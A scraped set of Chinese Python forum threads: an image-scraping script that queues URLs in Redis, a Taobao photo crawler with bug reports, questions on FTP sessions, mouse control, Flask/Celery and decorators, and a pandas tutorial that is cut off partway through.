[
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>又在<a href=\"\" rel=\"nofollow\">腾云阁</a>发现一篇 Python 的爬虫文章，顺便存了。</p>\n<p>收录待用，修改转载已取得<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权</p>\n<hr>\n<p>节选：</p>\n<p>...</p>\n<p>这是用来下载美图网上 100 个页面的所有的图片</p>\n<pre><code>import requests\nimport re\nimport time\nfrom redis import Redis\nheaders={ 'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36' }\n\ndef push_redis_list():\n    r = Redis(host='10.66.149.8',port=6379,password='')\n    for i in range(100):\n        num = 5100+i;\n        url ='http://www.meizitu.com/a/'+ str(num) +'.html'\n        img_url = requests.get(url,timeout=30)\n        #print img_url.text\n        #time.sleep(10)\n        img_url_list = re.findall('http://mm.howkuai.com/wp-content/uploads/201.*.jpg',img_url.text)\n        print(img_url_list)\n        for temp_img_url in img_url_list:\n            l = len(re.findall('limg',temp_img_url))\n            #print l\n            if(l == 0):\n                print(\"url: \",temp_img_url)\n                r.lpush('meizitu',temp_img_url)\n        print(r.llen('meizitu'))\n    return 0\n\ndef get_big_img_url():\n    r = Redis(host='10.66.149.8',port=6379,password='')\n    while(1):\n        try:\n            url = r.lpop('meizitu')\n            download(url)\n            time.sleep(1)\n            print(url)\n        except:\n            print(\"请求求发送失败重试\")\n            time.sleep(10)\n            continue\n    return 0\n\ndef download(url):\n    try:\n        r = requests.get(url,headers=headers,timeout = 50)\n        name = int(time.time())\n        f = open('./pic/'+str(name)+'.jpg','wb')\n        f.write(r.content)\n        f.close()\n    except Exception as e:\n        print(Exception,\":\",e)\n\nif __name__ == '__main__':\n    url = 'http://www.meizitu.com/a/list_1_'\n    print(\"begin\")\n    push_redis_list()#开启则加任务队列\n    #get_big_img_url()#开启则运行爬取任务\n</code></pre>\n<p>...</p>\n<hr>\n<p>原文链接： <a href=\"https://www.qcloud.com/community/article/337567001488804157\" rel=\"nofollow\">https://www.qcloud.com/community/article/337567001488804157</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "玩法收藏/云服务器/ Python 操作 Redis", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 google 上逛了一圈，发现谈 nerual style transfer 的有无数，但是谈风格分类的却寥寥无几，找了半天资料发现所知甚少，来这里请教一下<br>\n（感觉踩上了一个天坑</p>\n</div></div>"], "reply": "7", "tittle": "如何实现图像风格分类", "comment": ["这比 style transfer 容易。有标定数据的话，用现有的特征 lbp sift pretrained model 随便搞搞估计都不错", " 我是想实现不同的图像风格的分类", " 感谢 我试试你说的办法 但是感觉不比 transfer 容易啊", " 感谢！我觉得很有用！还有没有相关的文档可以借鉴呢", " 其他资料你看看这篇文章引用的文献和 google scholar 里引用这篇文章的文献（授鱼不如授渔 233 ）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>我参考了一些流行的 python 开源项目，总结一下 python 开源项目结构。</p>\n</blockquote>\n<h2>基本结构</h2>\n<p><img alt=\"clipboard.png\" src=\"https://segmentfault.com/img/bVLGcH?w=770&amp;h=1012\"></p>\n<h2>结构说明</h2>\n<ul>\n<li>docs: 项目文档</li>\n<li>tests: 测试代码</li>\n<li>project: 项目内容</li>\n<li>.gitignore: git 忽略文件</li>\n<li>.travis.yml: 配置 travis ci</li>\n<li><a href=\"http://AUTHROS.md\" rel=\"nofollow\">AUTHROS.md</a>: 作者及贡献者列表</li>\n<li><a href=\"http://HISTORY.md\" rel=\"nofollow\">HISTORY.md</a>:版本更新历史说明（也可以用 <a href=\"http://CHANGELOG.md\" rel=\"nofollow\">CHANGELOG.md</a> ）</li>\n<li>LISENCE: 开源协议</li>\n<li><a href=\"http://README.md\" rel=\"nofollow\">README.md</a>: 项目说明</li>\n<li>Makefile: 编译配置（很多时候用不上）</li>\n<li>requirements.txt(运行依赖)</li>\n<li>requirements.dev.txt(开发依赖)</li>\n<li>requirements.test.txt(测试依赖)</li>\n<li><a href=\"http://setup.py\" rel=\"nofollow\">setup.py</a>: 安装配置，多用于发布到 pypi</li>\n<li>tox.ini: 自动化测试工具 tox 配置</li>\n</ul>\n<h2>模板地址</h2>\n<p><a href=\"https://github.com/gaojiuli/project\" rel=\"nofollow\">https://github.com/gaojiuli/project</a></p>\n</div></div>"], "reply": "9", "tittle": "Python 开源项目结构总结", "comment": ["官方指导 ", "python 应该是用 README.rst", " rst 我没找到支持 checkbox 的语法", " 还是有点区别的", "感觉改动好像叫 changelog 的多一点", " 我是看 kennethreits 的项目喜欢用 HISTORY, 而且这样感觉要舒服也一些．你觉得呢", "可以看看这个模版 ", " 这个也不错，在我参考的项目里面", "参照下面两个模板就够了:\r", "\r", "\r", "\r", "README.rst 的好处是能显示在 ", " 里， 当然项目里用 .md, 打包时转成 .rst 的也不少, 但至少最终的包里应该是 .rst"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我平时写后台的，看你们爬得高兴也来凑个热闹。\n做得很粗糙，没有考虑出错恢复什么的，有时间再加吧。\n地址是 <a href=\"https://github.com/carlonelong/TaobaoMMCrawler\" rel=\"nofollow\">https://github.com/carlonelong/TaobaoMMCrawler</a></p>\n</div></div>"], "reply": "33", "tittle": "我也搞了个抓淘宝 MM 的 py 程序", "comment": ["这是抓啥的？？？", " mm 相册", "原来是抓淘女郎…… \r", "话说抓过某特定关键词的买家秀，惊喜多多… 楼主可以试试… 记住分类排除内衣的（不让上图", " 这个刺激了", "能抓东京的大姐姐吗", "抓 cosplay 店的", " \r", "来提供一个~~", "  有道理", "报错了\r", "\r", "start downloading 田媛媛\r", "current page 1\r", "start downloading album 10000702574 45ÕÅ 张\r", "Traceback (most recent call last):\r", "  File \"/Users/hunter/Downloads/TaobaoMMCrawler-master/crawler.py\", line 83, in <module>\r", "    c.getAlbums()\r", "  File \"/Users/hunter/Downloads/TaobaoMMCrawler-master/crawler.py\", line 58, in getAlbums\r", "    self.getImages(model_id, album_id, album_img_count.strip(u'张'))\r", "  File \"/Users/hunter/Downloads/TaobaoMMCrawler-master/crawler.py\", line 65, in getImages\r", "    for page in xrange(1, (int(image_count)-1)/16+2):\r", "ValueError: invalid literal for int() with base 10: '45\\xd5\\xc5'", " 编码出问题了。。 你是啥环境啊", "美图秀秀修过度的图，不如看看那些国内的擦边套图", "好像有 BUG 啊\r", "\r", "```\r", "$ python crawler.py\r", "start downloading 田媛媛\r", "current page 1\r", "start downloading album 10000702574 45ÕÅ 张\r", "Traceback (most recent call last):\r", "  File \"crawler.py\", line 83, in <module>\r", "    c.getAlbums()\r", "  File \"crawler.py\", line 58, in getAlbums\r", "    self.getImages(model_id, album_id, album_img_count.strip(u'张'))\r", "  File \"crawler.py\", line 65, in getImages\r", "    for page in xrange(1, (int(image_count)-1)/16+2):\r", "ValueError: invalid literal for int() with base 10: '45\\xd5\\xc5'\r", "```", "抓淘宝 MM \r", "好 h", "41 行   soup = bs(self.readHtml(model_url).decode('gbk'), 'html.parser')  修改成功 不报错了", " 好 thx 我改一下", "Python 版本要多少啊？ \r", "我 2.7 在 Mac 和 Windows 下都报同样的错呢\r", "````\r", "Traceback (most recent call last):\r", "  File \"TaobaoMMCrawler.py\", line 5, in <module>\r", "    from bs4 import BeautifulSoup as bs\r", "ImportError: No module named bs4\r", "````", " 👍", " 这个是因为你没装 beautifulsoup pip install bs4 应该就可以了", "可以添加浏览器 UA\r", "爬的时候限制一下，不然会 GG", "提了个 pr ，有些文件是 png 格式的（", " 多谢", " thx 另外吐个槽，很不喜欢 python3 的 print = =", " 嗯，回头改一下", "r#22 @", " import urllib.request", " haha 我是懒得装两份 bs4 requests ……就不说刚开始用 print 的时候是按照 printf 的格式用的了……捂脸", "去掉_620x10000.jpg 是大图", " 我去 我居然没有发现", " \r", " \r", "\r", "去掉以后， imghdr 有时候无法识别格式了，下载了看是 jpg ……", "不能抓回家不好", " 3D 打印 你值得拥有", " 我今天晚上把俩文件合一块吧", " 不能用 有啥用？", "把 py2/3 放在一起了"]},
{"content": ["<div class=\"topic_content\">当用户正确登录以后，怎么保存这个状态，达到本次所有 ftp 操作不需要验证身份，客户端正常或意外退出后及时注销。如果再次登录则还需要验证身份的效果。小白求解。</div>"], "reply": "5", "tittle": "小白自学，在用 socket 简单实现 ftp，有个用户登录状态的问题请教", "comment": ["每次连接实例化一个 client 类？这不就有状态了", "ftp 不像 http ，是有状态的。你需要维护一个套接字=>状态的映射，记下连接的状态，包括是否已经验证过身份", "好吧上面说的服务端的情况。不过客户端你仍然需要记下状态", "不考虑其他身份验证的话，只能存密码，或者保证连接不断", " 谢谢，我试试，貌似得抓各种退出的异常。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>利用库能实现鼠标鼠标光标移动\n但是一移动真实鼠标实际上还在原地没有移动\n如何控制真实鼠标位置\n小白一枚，虚心求教各位大牛😄</p>\n</div></div>"], "reply": "15", "tittle": "如何控制真实鼠标位置", "comment": ["哈？真实鼠标是指现实中的鼠标吗？难不成鼠标还能动…？\r", "\r", "ps. 建议说清楚 鼠标 还是 指针", "机械臂", "你要给鼠标装上导轨和步进电机，然后树莓派是可以用 python 编程的，用它来控制步进电机，你就可以控制真实鼠标的位置了。", " 额，是我表述不清，是指的桌面上动的那个鼠标光标，虽然用 py 库实现了移动到某个坐标，但是一移动真实的鼠标，光标却还在原地，希望知道怎么实现和手上鼠标同步的移动", " \r", " 我表述能力差。。。", " 你是想由计算机运行的程序反过来控制鼠标动吗？还是想了解鼠标工作中数据传输的部分？", " 想由计算机运行的程序反过来控制鼠标动，但是移动了发现和手上鼠标是不同步的，比如我用程序吧光标移动到左上角，但移动手上鼠标时候光标缺还在之前本来就停留的那里", " 那是你移动后没点击，类似获取焦点", "对 python 不熟，不知道楼主有没有写过外挂之类的，我觉得区别应该在 click(x,y) 和 move(x,y) 这两者。\r", "实在不行，直接调用 Win32 接口也可以啊， SetCursorPos ， mouse_event 之类的", " \r", " 发现是因为虚拟机的缘故导致的这样。。。", "是因为虚拟机光标共享的缘故=，=||| 抱歉", "我猜 LZ 的需求是这样的：\r", "\r", "写一个 python 程序，让鼠标既可以人肉控制，又可以程序控制。\r", "\r", "应该这么做\r", "系统层面劫持鼠标移动事件，此时系统对物理层鼠标移动无感知；而且这个程序可以向系统转发鼠标移动事件。", "我为什么脑补 python 进来……", " 污污污 666", "看了一眼感觉是虚拟机内外鼠标同步的问题。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>昨天转载收录的文章有人回复 V2 禁止全文转载。于是我看了下使用指南，的确明确指出反对全文转载，这里表示抱歉，所以说获得作者授权也不能转载么？</em>\n<br>\n<br>\n<em>本意是方便学习，所以从现在开始我只对文章进行摘抄好了，文章收录待用，修改转载已取得<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权</em></p>\n<hr>\n<ul>\n<li>\n<p>知乎爬虫运行在<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>主机上的原因是怕被网站封 IP ，这里提醒下各位程序员在部署爬虫的时候注意不要调的太高并发，对于网站的正常用户访问造成影响，这也算是使用爬虫主要注意的一点基本技术素养吧。</p>\n</li>\n<li>\n<p>1.知乎 200 位种子用户中创业者占比最高，设计师类活跃度最高。</p>\n</li>\n<li>\n<p>2.知乎四位创始人在知乎上回答的时间分布-活跃曲线，看看知乎这样的社区产品是不是存在对于创始团队活跃度的依赖？</p>\n</li>\n</ul>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488806555958_8014_1488806556144.png\">\n<ul>\n<li>3.分析回答的问题中涉及关键词的词频分析，看看知乎的社区氛围在创始人们回答中体现的如何？</li>\n</ul>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488806575495_9322_1488806575686.jpg\">\n<p><strong>小结：从以上数据我们可以看出</strong></p>\n<ul>\n<li>1 ）知乎的近 200 位种子用户中，互联网领域创业者、投资人、程序员、媒体人偏多，但是从用户活跃数据来看，知乎上、艺术、教育、电影等其他类目的用户也颇为活跃，“互联网”以外其他话题的火热，也是知乎能够走到今日用户规模的重要原因。</li>\n<li>2 ）知乎社区亟待形成认真回答氛围的早期，需要创始团队积极参与社区内容建设。知乎的 4 位创始人在知乎成立的头三年 2010-2012 年累计回答了 2345 个问题，占他们 4 人累积回答数的 86%， 13-15 年合计回答了 312 个问题， 16 年-17 年一共才回答了 39 个问题，说明社区的氛围走上轨道了。</li>\n<li>3 ）知乎的创始人们回答问题也不是都能达到超过 1000 个赞，知乎创始人们累计回答 2696 个问题，获赞 27 万，也就是平均 1 个回答 100 个赞左右，所以你的知乎回答，获赞数量有没有超过 100 个赞这个水准呢？</li>\n</ul>\n<p><strong>后续计划在下一篇文章中分析知乎产品迭代的版本历史，分析哪些是核心的功能迭代，知乎整体的信息流来源与分发机制，商业变现的产品形态；从知乎小管家的文章看社区机制的变化，社区成长的不同阶段， KOL 群体演化的历史，比如传说中的知乎万粉群的存在。</strong></p>\n<hr>\n<p><em>原文来自： <a href=\"https://www.qcloud.com/community/article/245046001488461803\" rel=\"nofollow\">https://www.qcloud.com/community/article/245046001488461803</a></em></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "爬虫学习日记/知乎简史 1", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>要让 Celery 服务在 Flask app 的上下文中生效，就须要在 Flask 工厂模式中创建 celery 服务，在具体业务中再 import 。</p>\n<p>如果在 Flask 创建 app 之前，就生成 celery 的服务，又不能在上下文中起效。</p>\n<p>大家是怎么解决相互 import 的问题的？</p>\n</div></div>"], "reply": "2", "tittle": "Flask 使用工厂模式创建 app，配置 Celery 时，大家是怎么解决循环 import 的？", "comment": ["不是有 init_app 方法嘛", "参考 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>def get(path):\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args, **kw):\n            return func(*args, **kw)\n\n        wrapper.__method__ = 'GET'\n        return wrapper\n\n    return decorator\n</code></pre>\n<p>假设 func 函数名是 a</p>\n<pre><code>print(a.__method__) 的结果就是‘ GET'\n</code></pre>\n<p>我的问题：</p>\n<p>这个__method__属性是怎么传递给 func 的，不是 wrapper 的属性么？</p>\n</div></div>"], "reply": "4", "tittle": "请教，关于装饰器的一个小问题", "comment": ["a 被 get 装饰后， a 就成了 wrapper 了啊，访问 a 就是访问 wrapper", "听说有个叫 functools 的包，里面有个叫 wraps 的装饰器", "func 被装饰后相当于 a=wrapper(func)，这里的 a 其实就是一个 wrapper ，所以 a 就有了__method__属性；需要注意的是： functools.wraps 装饰器会把 func 的一些 metadata 更新到 a 中，比如__name__,__doc__,__module__等属性", "参考 Cookbook 9.1/9.2 ", "\r", "\r", "\"\\@wraps\" 会保留被装饰函数的元信息"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>python 之数据分析利器</h1>\n<p>这一部分主要学习 pandas 中基于前面两种数据结构的基本操作。</p>\n<p>设有 DataFrame 结果的数据 a 如下所示：</p>\n<p>一、查看数据（查看对象的方法对于 Series 来说同样适用）</p>\n<p>1.查看 DataFrame 前 xx 行或后 xx 行\na=DataFrame(data);\na.head(6)表示显示前 6 行数据，若 head()中不带参数则会显示全部数据。\na.tail(6)表示显示后 6 行数据，若 tail()中不带参数则也会显示全部数据。</p>\n<pre><code>import pandas as pd\nimport numpy as np\na=pd.DataFrame([[4,1,1],[6,2,0],[6,1,6]],index=['one','two','three'],columns=['a','b','c'])\na\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-35b71c8729eeb89df26069d11dc4a1de_b.png\">\n<pre><code>a.head(2)\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-abae2a147c166112b1fabad144beb534_b.png\">\n<pre><code>a.tail(2)\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-40e7f982d40f0e467aab91884d0edf96_b.png\">\n<p>2.查看 DataFrame 的 index ， columns 以及 values\na.index ; a.columns ; a.values 即可</p>\n<pre><code>a.index\nIndex([u'one', u'two', u'three'], dtype='object')\n</code></pre>\n<pre><code>a.columns\nIndex([u'a', u'b', u'c'], dtype='object')\n</code></pre>\n<pre><code>a.values\narray([[4, 1, 1],\n       [6, 2, 0],\n       [6, 1, 6]])\n</code></pre>\n<p>3.describe()函数对于数据的快速统计汇总</p>\n<p>a.describe()对每一列数据进行统计，包括计数，均值， std ，各个分位数等。</p>\n<pre><code>a.describe\n&lt;bound method DataFrame.describe of        a  b  c\none    4  1  1\ntwo    6  2  0\nthree  6  1  6&gt;\n</code></pre>\n<p>4.对数据的转置</p>\n<pre><code>a.T\n</code></pre>\n<img src=\"http://pic2.zhimg.com/v2-258f3b9ed78d85ed09ef6d83c71344f9_b.png\">\n<p>5.对轴进行排序\na.sort_index(axis=1,ascending=False)；其中 axis=1 表示对所有的 columns 进行排序，下面的数也跟着发生移动。后面的 ascending=False 表示按降序排列，参数缺失时默认升序。</p>\n<pre><code>a.sort_index(axis=1,ascending=False);\na\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-86266a6d08d4a1c4320d962caa9d8e76_b.png\">\n<p>6.对 DataFrame 中的值排序\na.sort(columns=’ x ’)\n即对 a 中的 x 这一列，从小到大进行排序。注意仅仅是 x 这一列，而上面的按轴进行排序时会对所有的 columns 进行操作。</p>\n<pre><code>a.sort(columns='c')\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-9099385f856f1473506f58bc69e6d612_b.png\">\n<p>二、选择对象</p>\n<p>1.选择特定列和行的数据\na[‘ x ’] 那么将会返回 columns 为 x 的列，注意这种方式一次只能返回一个列。 a.x 与 a[‘ x ’]意思一样。</p>\n<p>取行数据，通过切片[]来选择\n如： a[0:3] 则会返回前三行的数据。</p>\n<pre><code>a['a']\none      4\ntwo      6\nthree    6\nName: a, dtype: int64\n</code></pre>\n<pre><code>a[0:2]\n</code></pre>\n<img src=\"http://pic2.zhimg.com/v2-e6cb1be938d26599f8b780bf2a8e16b1_b.png\">\n<p>2.通过标签来选择\na.loc[‘ one ’]则会默认表示选取行为’ one ’的行；</p>\n<p>a.loc[:,[‘ a ’,’ b ’] ] 表示选取所有的行以及 columns 为 a,b 的列；</p>\n<p>a.loc[[‘ one ’,’ two ’],[‘ a ’,’ b ’]] 表示选取’ one ’和’ two ’这两行以及 columns 为 a,b 的列；</p>\n<p>a.loc[‘ one ’,’ a ’]与 a.loc[[‘ one ’],[‘ a ’]]作用是一样的，不过前者只显示对应的值，而后者会显示对应的行和列标签。</p>\n<p>3.通过位置来选择</p>\n<p>这与通过标签选择类似\na.iloc[1:2,1:2] 则会显示第一行第一列的数据;(切片后面的值取不到)</p>\n<p>a.iloc[1:2] 即后面表示列的值没有时，默认选取行位置为 1 的数据;</p>\n<p>a.iloc[[0,2],[1,2]] 即可以自由选取行位置，和列位置对应的数据。</p>\n<pre><code>a.iloc[1:2,1:2]\n</code></pre>\n<img src=\"http://pic4.zhimg.com/v2-2ddaf46e05b787df8963f329644cb14f_b.png\">\n<p>4.使用条件来选择\n使用单独的列来选择数据\na[a.c&gt;0] 表示选择 c 列中大于 0 的数据</p>\n<pre><code>a[a.c&gt;0]\n</code></pre>\n<img src=\"http://pic4.zhimg.com/v2-e332e9fc3cff1c7018b79d4fc3bf2a0b_b.png\">\n<p>使用 where 来选择数据\na[a&gt;0] 表直接选择 a 中所有大于 0 的数据</p>\n<pre><code>a[a&gt;0]\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-1e46d1802345ec740ce87d8980aec320_b.png\">\n<p>使用 isin()选出特定列中包含特定值的行\na1=a.copy()\na1[a1[‘ one ’].isin([‘ 2 ′,’ 3 ′])] 表显示满足条件：列 one 中的值包含’ 2 ’,’ 3 ’的所有行。</p>\n<pre><code>a1=a.copy()\na1[a1['a'].isin([4])]\n</code></pre>\n<img src=\"http://pic2.zhimg.com/v2-bf8072332ba11ff671c72533be3d154d_b.png\">\n<p>三、设置值（赋值）</p>\n<p>赋值操作在上述选择操作的基础上直接赋值即可。\n例 a.loc[:,[‘ a ’,’ c ’]]=9 即将 a 和 c 列的所有行中的值设置为 9\na.iloc[:,[1,3]]=9 也表示将 a 和 c 列的所有行中的值设置为 9</p>\n<p>同时也依然可以用条件来直接赋值</p>\n<p>a[a&gt;0]=-a 表示将 a 中所有大于 0 的数转化为负值</p>\n<pre><code>a.loc[:,['a','c']]=9\na\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-deae7ce88ea5cdd3697277447fc9c906_b.png\">\n<pre><code>a.iloc[:,[0,1,2]]=7\na\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-1e588217ec0548e06459e4a240704c30_b.png\">\n<pre><code>a[a&gt;0]=-a\na\n</code></pre>\n<img src=\"http://pic2.zhimg.com/v2-4f422c078dff60685f3dd012c1962385_b.png\">\n<p>四、缺失值处理</p>\n<p>在 pandas 中，使用 np.nan 来代替缺失值，这些值将默认不会包含在计算中。</p>\n<p>1.reindex()方法\n用来对指定轴上的索引进行改变 /增加 /删除操作，这将返回原始数据的一个拷贝。\na.reindex(index=list(a.index)+[‘ five ’],columns=list(b.columns)+[‘ d ’])</p>\n<p>a.reindex(index=[‘ one ’,’ five ’],columns=list(b.columns)+[‘ d ’])</p>\n<p>即用 index=[]表示对 index 进行操作， columns 表对列进行操作。</p>\n<pre><code>b=a.reindex(index=list(a.index)+['four'],columns=list(a.columns)+['d'])\nc=b.copy()\nc\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-5e47f01e84c05781f5750ed455677ac8_b.png\">\n<p>2.对缺失值进行填充\na.fillna(value=x)\n表示用值为 x 的数来对缺失值进行填充</p>\n<pre><code>b.fillna(value=100)\n</code></pre>\n<img src=\"http://pic2.zhimg.com/v2-51d5781864ea5c83010b2e4871eb673d_b.png\">\n<p>3.去掉包含缺失值的行\na.dropna(how=’ any ’)\n表示去掉所有包含缺失值的行</p>\n<pre><code>c.dropna(how='any')\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-c20d03140519c55a6d8fcd64d81139da_b.png\">\n<p>五、合并</p>\n<p>1.contact\ncontact(a1,axis=0/1 ， keys=[‘ xx ’,’ xx ’,’ xx ’,…])，其中 a1 表示要进行连接的列表数据,axis=1 时表横着对数据进行连接。 axis=0 或不指定时，表将数据竖着进行连接。 a1 中要连接的数据有几个则对应几个 keys ，设置 keys 是为了在数据连接以后区分每一个原始 a1 中的数据。</p>\n<p>例： a1=[b[‘ a ’],b[‘ c ’]]\nresult=pd.concat(a1,axis=1 ， keys=[‘ 1 ′,’ 2 ’])</p>\n<pre><code>a1=[b['a'],b['c']]\nd=pd.concat(a1,axis=1,keys=['1','2'])\nd\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-a02b93e8e01eae0593048b76b1a93ed0_b.png\">\n<p>2.Append 将一行或多行数据连接到一个 DataFrame 上\na.append(a[2:],ignore_index=True)\n表示将 a 中的第三行以后的数据全部添加到 a 中，若不指定 ignore_index 参数，则会把添加的数据的 index 保留下来，若 ignore_index=Ture 则会对所有的行重新自动建立索引。</p>\n<pre><code>a.append(a[2:],ignore_index=True)\n</code></pre>\n<img src=\"http://pic3.zhimg.com/v2-9cf691708eb94d1d1cfa2fb2b69c02ae_b.png\">\n<p>3.merge 类似于 SQL 中的 join\n设 a1,a2 为两个 dataframe,二者中存在相同的键值，两个对象连接的方式有下面几种：\n(1)内连接， pd.merge(a1, a2, on=’ key ’)\n(2)左连接， pd.merge(a1, a2, on=’ key ’, how=’ left ’)\n(3)右连接， pd.merge(a1, a2, on=’ key ’, how=’ right ’)\n(4)外连接， pd.merge(a1, a2, on=’ key ’, how=’ outer ’)\n至于四者的具体差别，具体学习参考 sql 中相应的语法。</p>\n<pre><code>pd.merge(b,c,on='a')\n</code></pre>\n<img src=\"http://pic1.zhimg.com/v2-376818214d5d64793c71a139d7346754_b.png\">\n<p>六、分组（ groupby ）</p>\n<p>用 pd.date_range 函数生成连续指定天数的的日期\npd.date_range(‘ 20000101 ’,periods=10)</p>\n<p>def shuju():</p>\n<p>data={</p>\n<p>‘ date ’:pd.date_range(‘ 20000101 ’,periods=10),</p>\n<p>‘ gender ’:np.random.randint(0,2,size=10),</p>\n<p>‘ height ’:np.random.randint(40,50,size=10),</p>\n<p>‘ weight ’:np.random.randint(150,180,size=10)</p>\n<p>}</p>\n<p>a=DataFrame(data)</p>\n<p>print(a)</p>\n<p>date gender height weight</p>\n<p>0 2000-01-01 0 47 165</p>\n<p>1 2000-01-02 0 46 179</p>\n<p>2 2000-01-03 1 48 172</p>\n<p>3 2000-01-04 0 45 173</p>\n<p>4 2000-01-05 1 47 151</p>\n<p>5 2000-01-06 0 45 172</p>\n<p>6 2000-01-07 0 48 167</p>\n<p>7 2000-01-08 0 45 157</p>\n<p>8 2000-01-09 1 42 157</p>\n<p>9 2000-01-10 1 42 164</p>\n<p>用 a.groupby(‘ gender ’).sum()得到的结果为： #注意在 python 中 groupby(” xx)后要加 sum()，不然显示</p>\n<p>不了数据对象。</p>\n<p>gender height weight</p>\n<p>0 256 989</p>\n<p>1 170 643</p>\n<p>此外用 a.groupby(‘ gender ’).size()可以对各个 gender 下的数目进行计数。</p>\n<p>所以可以看到 groupby 的作用相当于：\n按 gender 对 gender 进行分类，对应为数字的列会自动求和，而为字符串类型的列则不显示；当然也可以同时 groupby([‘ x1 ′,’ x2 ’,…])多个字段，其作用与上面类似。</p>\n<pre><code>a2=pd.DataFrame({\n        'date':pd.date_range('20000101',periods=10),\n        'gender':np.random.randint(0,2,size=10),\n        'height':np.random.randint(40,50,size=10),\n        'weight':np.random.randint(150,180,size=10)\n    })\nprint(a2)\n\n        date  gender  height  weight\n0 2000-01-01       0      43     151\n1 2000-01-02       1      40     171\n2 2000-01-03       1      49     169\n3 2000-01-04       1      48     165\n4 2000-01-05       0      42     159\n5 2000-01-06       1      48     152\n6 2000-01-07       0      48     154\n7 2000-01-08       1      40     151\n8 2000-01-09       0      41     158\n9 2000-01-10       0      44     175\n\n</code></pre>\n<pre><code>a2.groupby('gender').sum()\n</code></pre>\n<img src=\"http://pic4.zhimg.com/v2-f174b52c009153a0484805f50c285d2b_b.png\">\n<p>七、 Categorical 按某一列重新编码分类</p>\n<p>如六中要对 a 中的 gender 进行重新编码分类，将对应的 0 ， 1 转化为 male ， female ，过程如下：</p>\n<p>a[‘ gender1 ’]=a[‘ gender ’].astype(‘ category ’)</p>\n<p>a[‘ gender1 ’].cat.categories=[‘ male ’,’ female ’] #即将 0 ， 1 先转化为 category 类型再进行编码。</p>\n<p>print(a)得到的结果为：</p>\n<p>date gender height weight gender1</p>\n<p>0 2000-01-01 1 40 163 female</p>\n<p>1 2000-01-02 0 44 177 male</p>\n<p>2 2000-01-03 1 40 167 female</p>\n<p>3 2000-01-04 0 41 161 male</p>\n<p>4 2000-01-05 0 48 177 male</p>\n<p>5 2000-01-06 1 46 179 female</p>\n<p>6 2000-01-07 1 42 154 female</p>\n<p>7 2000-01-08 1 43 170 female</p>\n<p>8 2000-01-09 0 46 158 male</p>\n<p>9 2000-01-10 1 44 168 female</p>\n<p>所以可以看出重新编码后的编码会自动增加到 dataframe 最后作为一列。</p>\n<pre><code>a2['gender1']=a2['gender'].astype('category')\na2['gender1'].cat.categories=['male','female']\na2\n\n</code></pre>\n<img src=\"http://pic4.zhimg.com/v2-2d193f9ef962bcf87475f6bc206891ef_b.png\">\n<p>八、相关操作</p>\n<p>描述性统计：\n1.a.mean() 默认对每一列的数据求平均值；若加上参数 a.mean(1)则对每一行求平均值；</p>\n<pre><code>a2.mean()\ngender      0.5\nheight     44.3\nweight    160.5\ndtype: float64\n</code></pre>\n<p>2.统计某一列 x 中各个值出现的次数： a[‘ x ’].value_counts()；</p>\n<pre><code>a2['height'].value_counts()\n0    64.666667\n1    70.666667\n2    73.000000\n3    71.333333\n4    67.000000\n5    67.000000\n6    67.333333\n7    64.000000\n8    66.333333\n9    73.000000\ndtype: float64\n</code></pre>\n<p>3.对数据应用函数\na.apply(lambda x:x.max()-x.min())\n表示返回所有列中最大值-最小值的差。</p>\n<pre><code>d.apply(lambda x:x.max()-x.min())\n1    0\n2    0\ndtype: float64\n</code></pre>\n<p>4.字符串相关操作\na[‘ gender1 ’].str.lower() 将 gender1 中所有的英文大写转化为小写，注意 dataframe 没有 str 属性，只有 series 有，所以要选取 a 中的 gender1 字段。</p>\n<pre><code>a2['gender1'].str.lower()\n0      male\n1    female\n2    female\n3    female\n4      male\n5    female\n6      male\n7    female\n8      male\n9      male\nName: gender1, dtype: object\n</code></pre>\n<p>九、时间序列</p>\n<p>在六中用 pd.date_range(‘ xxxx ’,periods=xx,freq=’ D/M/Y ….’)函数生成连续指定天数的的日期列表。\n例如 pd.date_range(‘ 20000101 ’,periods=10),其中 periods 表示持续频数；\npd.date_range(‘ 20000201 ′,’ 20000210 ′,freq=’ D ’)也可以不指定频数，只指定其实日期。</p>\n<p>此外如果不指定 freq ，则默认从起始日期开始，频率为 day 。其他频率表示如下：</p>\n<pre><code>print(pd.date_range('20000201','20000210',freq='D'))\nDatetimeIndex(['2000-02-01', '2000-02-02', '2000-02-03', '2000-02-04',\n               '2000-02-05', '2000-02-06', '2000-02-07', '2000-02-08',\n               '2000-02-09', '2000-02-10'],\n              dtype='datetime64[ns]', freq='D')\n</code></pre>\n<pre><code>print(pd.date_range('20000201',periods=5))\nDatetimeIndex(['2000-02-01', '2000-02-02', '2000-02-03', '2000-02-04',\n               '2000-02-05'],\n              dtype='datetime64[ns]', 